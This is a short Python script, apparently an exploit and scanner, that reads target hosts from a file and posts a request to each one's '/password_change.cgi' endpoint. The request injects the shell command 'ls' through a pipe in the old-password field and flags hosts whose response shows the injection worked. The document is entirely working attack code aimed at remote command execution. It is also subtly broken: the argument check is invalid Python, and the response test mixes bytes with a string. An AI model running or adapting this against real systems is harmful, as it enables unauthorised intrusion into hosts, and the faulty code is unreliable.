import requests
import re
import sys

def exploit(url):
    vuln_url = url + "/password_change.cgi"
    headers = {
    'Accept-Encoding': "gzip, deflate",
    'Accept': "*/*",
    'Accept-Language': "en",
    'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    'Connection': "close",
    'Cookie': "redirect=1; testing=1; sid=x; sessiontest=1",
    'Referer': "%s/session_login.cgi"%url,
    'Content-Type': "application/x-www-form-urlencoded",
    'Content-Length': "60",
    'cache-control': "no-cache"
    } 
    payload="user=rootxx&pam=&expired=2&old=test|ls&new1=test2&new2=test2"
    r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
    if r.status_code == 200 and "The current password is " in r.content:
        print("\nvuln_url= %s" % vuln_url)
    else:
        print("\nnot vuln")


if __name__ == "__main__":
    if file = sys.argv[1]:
        targets = open(file,"r")
        for target in targets:
            exploit(target)
        targets.close()
    else:
        print("file name arg[1]")